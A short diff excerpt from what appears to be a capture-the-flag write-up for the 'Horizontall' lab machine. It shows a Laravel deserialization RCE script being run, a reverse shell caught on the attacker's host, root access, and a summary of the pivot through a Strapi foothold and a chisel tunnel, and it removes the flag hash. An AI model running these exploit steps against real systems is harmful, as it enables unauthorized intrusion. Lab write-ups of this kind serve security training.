@@ -231,7 +231,6 @@ python3 laravel-rce.py http://127.0.0.1:8000 /tmp/exploit.phar
 connect to [10.10.15.146] from (UNKNOWN) [10.129.73.112] 53054
 root@horizontall:/home/developer/myproject/public# cd /root
 root@horizontall:~# cat root.txt
-0be98d2c423b9a5de02c195472735e86
 ```
 
 ✅ **Full compromise** — root shell obtained through the internal Laravel instance's deserialization RCE, reached entirely via the chisel tunnel pivoted through the initial Strapi foothold.
